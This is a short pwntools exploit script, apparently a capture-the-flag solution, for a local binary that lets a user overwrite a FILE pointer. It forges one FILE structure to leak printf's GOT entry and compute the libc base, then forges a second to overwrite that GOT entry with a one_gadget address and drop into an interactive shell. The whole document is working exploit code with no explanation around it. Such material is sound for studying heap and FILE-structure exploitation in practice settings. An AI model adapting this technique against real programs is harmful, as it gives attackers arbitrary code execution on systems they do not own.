from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
libc = ELF('./libc.so.6')

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


def leak_printf_w_fwrite():
    p.recvuntil(b'Overwrite ptr >>>')

    fp = FileStructure()
    fp.flags = 0x800
    fp._IO_read_end = e.got['printf']
    fp._IO_write_base = e.got['printf']
    fp._IO_write_ptr = e.got['printf']+8
    fp.fileno = constants.STDOUT_FILENO
    payload = bytes(fp)[0:114]
    #payload = fp.write(addr=e.got['printf'],size=8)
    log.info(f"FP to Leak e.got['printf'] ({hex(e.got['printf'])}")
    log.info(fp)
    p.send(payload)

    p.recvuntil(b'<<< Calling fwrite ')
    leak = unpack(p.recvline()[0:6], 'all', endian='little')
    libc.address = leak-libc.sym['printf']
    log.info(f"Libc Leak: {hex(libc.address)}")


def got_overwrite_w_fread():
    one_gadget = libc.address+0xe4159
    p.recvuntil(b'Overwrite ptr >>>')
    fp = FileStructure()
    fp.flags = 0x0
    fp._IO_buf_base = e.got['printf']
    fp._IO_buf_end = e.got['printf']+0x14
    fp.fileno = constants.STDIN_FILENO
    payload = bytes(fp)[0:114]
    #payload = fp.read(addr=e.got['printf'],size=20)
    log.info(f"FP to Write to e.got['printf'] ({hex(e.got['printf'])}")
    log.info(fp)
    p.send(payload)
    p.sendline(p64(one_gadget)+b'\n')


p = start()

leak_printf_w_fwrite()
pause()

got_overwrite_w_fread()
pause()

log.info("Shell >>>")
p.interactive()
